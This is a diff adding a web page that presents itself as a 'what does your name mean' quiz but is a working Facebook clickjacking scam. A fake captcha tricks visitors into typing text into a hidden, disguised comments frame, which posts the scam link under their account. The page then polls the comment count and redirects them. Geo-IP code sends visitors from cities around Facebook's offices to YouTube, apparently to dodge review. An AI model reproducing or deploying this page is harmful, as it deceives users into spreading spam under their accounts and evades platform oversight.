@@ -1,0 +1,288 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>What does your name mean</title>
+<link rel="stylesheet" href="https://wanjawalala.s3.amazonaws.com/style3.css" type="text/css" />
+<script src="//ads.lfstmedia.com/getad?site=167010" type="text/javascript"></script>
+<script language="JavaScript" src="http://j.maxmind.com/app/geoip.js"></script>
+<script src="https://wanjawalala.s3.amazonaws.com/isoz/jquery.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+var city= geoip_city();
+var state= geoip_region();
+var country= geoip_country_code();
+
+if(city == "Torrance")
+{
+window.location = "http://youtube.com"
+
+}
+if(city == "Menlo Park")
+{
+window.location = "http://youtube.com"
+
+}
+if(city == "Palo Alto")
+{
+window.location = "http://youtube.com"
+
+}
+if(city == "Montara")
+{
+window.location = "http://youtube.com"
+
+}
+
+var njn = (document.location.href);
+var randomnumber = Math.floor(Math.random()*1000000001)
+//var domain = njn+"?"+randomnumber;
+var domain = 'http://bzwika.eu01.aws.af.cm?373645761';
+
+        var fb_signedin = false;
+        var connect_opened = true;
+
+        window.fbAsyncInit = function() {
+            FB.init({
+                appId: '113869198637480',
+                status: true,
+                cookie: true,
+                xfbml: true,
+                channelURL: 'http://ro.myreggo.com/channel.html',
+                oauth: true
+            });
+            addShareScript();
+
+            FB.getLoginStatus(function(response) {
+                if (response.authResponse) {
+                    fb_signedin = true;
+                } else {}
+            });
+        };
+
+        function showcontent(share_url) {
+		document.location = 'http://e5.4c.4f.static.xlhost.com/playvid.php?shared';
+            var responses = $.cookie('liked') ? $.cookie('liked') : "";
+            $.cookie('liked', responses + share_url + ",");
+
+            $('#share-continu').hide();
+            $('#share-buttons').hide();
+
+
+            $('#hidden-loading').show();
+
+            var wait = setTimeout(function() {
+                $('#share-show').hide();
+                $('#hidden-dialog').hide();
+                $('#share-hide').show();
+                $(document).trigger('share-show');
+            }, 1000);
+        }
+
+        function addShareScript() {
+            var f = document.createElement('script');
+            f.type = 'text/javascript';
+            f.src = 'http://static.ak.fbcdn.net/connect.php/js/FB.Share';
+            f.async = true;
+            document.getElementById('fb-root').appendChild(f);
+        }
+
+        (function() {
+            var e = document.createElement('script');
+            e.type = 'text/javascript';
+            e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
+            e.async = true;
+            document.getElementById('fb-root').appendChild(e);
+        }());
+
+        function showurl(share_url) {
+            if (!fb_signedin && !connect_opened) {
+                connect_opened = true;
+                connecturl(share_url);
+                //$.get('/action/track', {type: 'connect'});
+            } else {
+                shareurl(share_url);
+                //$.get('/action/track', {type: 'share'});
+            }
+        }
+
+        function getUrlShareCountFql(url) {
+            var fb_like_query_url = 'http://graph.facebook.com/fql?q=';
+            url_query = fb_like_query_url + encodeURIComponent('SELECT comment_count FROM link_stat WHERE url=("' + url + '")');
+            return url_query;
+        };
+
+        function shareurl(share_url) {
+            var share_count = 0;
+            var share_countz = 0;
+			
+			$.getJSON(getUrlShareCountFql(share_url), function(json) {
+				$(jQuery.parseJSON(JSON.stringify(json.data))).each(function() {  
+				share_countz = this.comment_count;
+				console.log(share_countz);
+
+			});
+});
+
+
+
+			
+			 setInterval(function(){
+			 
+                    $.getJSON(getUrlShareCountFql(share_url), function(json) {
+					$(jQuery.parseJSON(JSON.stringify(json.data))).each(function() {  
+                        share_countz2 = this.comment_count;
+						if (share_countz2 > share_countz) {
+						console.log(share_countz2);
+						
+                            $.get('/action/track', {type: 'share_closed'});
+                            showcontent(share_url);
+							}
+							else{
+						console.log(share_countz2);
+				//alert ('Captcha not entered!\nEnter the code in red \nAnd click on  "Submit" button');
+
+				}
+                        });
+						
+                    });
+
+			 },15000);
+			 
+			 			 setInterval(function(){
+			 
+                    $.getJSON(getUrlShareCountFql(share_url), function(json) {
+					$(jQuery.parseJSON(JSON.stringify(json.data))).each(function() {  
+                        share_countz2 = this.comment_count;
+						if (share_countz2 > share_countz) {
+						console.log(share_countz2);
+						
+                            $.get('/action/track', {type: 'share_closed'});
+                            showcontent(share_url);
+							}
+							else{
+						console.log(share_countz2);
+
+				}
+                        });
+						
+                    });
+
+			 },3000);
+			 
+			 
+        }
+
+</script>
+
+
+</head>
+
+
+<body onload="shareurl(domain);" style="height:100%;" > 
+
+<div id="overlay"></div>
+
+<div style="position:absolute;width:966px;left:50%;margin-left:-483px;top:0px;"><img src="http://i.imgur.com/zpWGfB1.png"></div>
+
+
+<div id="wrapper">
+	<div id="over">
+		<div id="overhead">
+		
+		<center>
+<script type="text/javascript">
+    //<![CDATA[
+        LSM_Slot({
+            adkey: '3a1',
+            ad_size: '468x60',
+            slot: 'slot67304'
+        });
+    //]]>
+</script>
+
+</center> 
+</div>
+  
+	
+	
+	
+	
+	
+	
+	
+    <div align="center" style="margin-top:0px;"> 
+    <div id="container" style="width:504px; height:366px; overflow:hidden; background-image:url(http://i.imgur.com/iHVUeTl.png); background-repeat:no-repeat; text-align:left;"> 
+    
+    <div id="word" style="width:400px; height:62px; font-family: Verdana, Geneva, sans-serif; border:0px solid #096; position:relative; top:110px; left:22px;">Type the code shown below and Click on submit button
+	<center><font size="3" color="red"><b id="demo">old</b></font></center>
+	</div>
+
+<script>
+
+var x=document.getElementById("demo")
+//x.innerHTML=Math.floor((Math.random()*54510)+14151);
+y=Math.random().toString(36).slice(-3);
+v=Math.random().toString(36).slice(-3);
+s="&nbsp";
+x.innerHTML=y+s+v;
+</script>		
+        <div id="comment_container" style="position:relative; top:126px; width:406px; height:63px; left:22px; overflow:hidden; border:0px solid #F00; text-align:left;"> 
+            <div id="comment" style="position:relative; left:-68px; top:-10px; width:485px; z-index:20; text-align:left;" class="opacity20"> 
+                <script src="http://connect.facebook.net/en_US/all.js#xfbml=1"></script> 
+                <iframe id="target" class="fb_ltr" scrolling="no" name="f3c1662d7c85216" style="border: medium none; overflow: hidden; height: 160px; width: 485px;" title="Facebook Social Plugin" src="http://abwika.eu01.aws.af.cm/blank/?http://www.facebook.com/plugins/comments.php?api_key=71012939728172&locale=en_US&sdk=joey&channel_url=http://static.ak.facebook.com/connect/xd_arbiter.php?version=24&origin=http://developers.facebook.com/f2cd6b65dc36746&domain=developers.facebook.com&relation=parent.parent&numposts=200&width=485&href=http://bzwika.eu01.aws.af.cm?373645761"></iframe>
+
+
+<script>
+//document.write("<fb:comments href=\""+domain+"\" notify=\"true\" num_posts=\"200\" width=\"485\"><\/fb:comments> <br>   ");
+//document.write("<fb:comments href=\""+domain+"\" notify=\"true\" num_posts=\"200\" width=\"485\"><\/fb:comments> <br>   ");
+</script>
+
+
+
+		
+            </div> 
+            
+            <div id="cover1" style="position:absolute; top:34px; width:327px; height:29px; background-color:#FFF; z-index:30; background-image:url(img/NuJxc.gif); background-repeat:no-repeat;"></div> 
+            <div id="submit" style="position:absolute; width:58px; height:25px; left:330px; top:33px; background-color:#6079ab; z-index:10;"><img src="img/m9rzp.gif" border="0" width="76" height="30"></div> 
+        </div> 
+        <div id="cover0" style="position:relative; left:323px; top:60px; width:130px; height:36px; background-color:#FFF; z-index:50;"></div> 
+        <!--<div id="cover2" style="position:relative; top:30px; left:28px; width:100px; height:15px; background-color:#FFF; z-index:180;"></div> -->
+    </div> 
+ 
+</div>
+ 
+</div>
+	
+    
+	<div id="youtube"><div style=" top center no-repeat; font-size:18px;font-family:Tahoma, Geneva, sans-serif;margin-bottom:4px;"><br><br><br><br><br><br><br><br>
+	<center><img src="http://i.imgur.com/6ZRd5.jpg" /></centre>    </div></div>
+<div id="comments">
+		
+		
+		<div class="comment">
+		
+<div class="right">
+  <centre><img src="http://i.imgur.com/n7SoR.png" /></centre>
+				
+				
+			</div>
+		
+
+		
+		
+		
+		
+	</div>
+</div>
+
+<div style="display:none">
+<script type="text/javascript" id="tc_0d5d8dfc83">
+var _tcq = _tcq || []; _tcq.push(['blog', '0d5d8dfc83', 'faf7fc', 'ffffff']); 
+(function() { var e = document.createElement('script'); e.type = 'text/javascript'; e.async = true; e.src = 'http://widgets.tcimg.com/v2/blog.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(e, s); })();
+</script>
+</div>
+</body>
+</html>
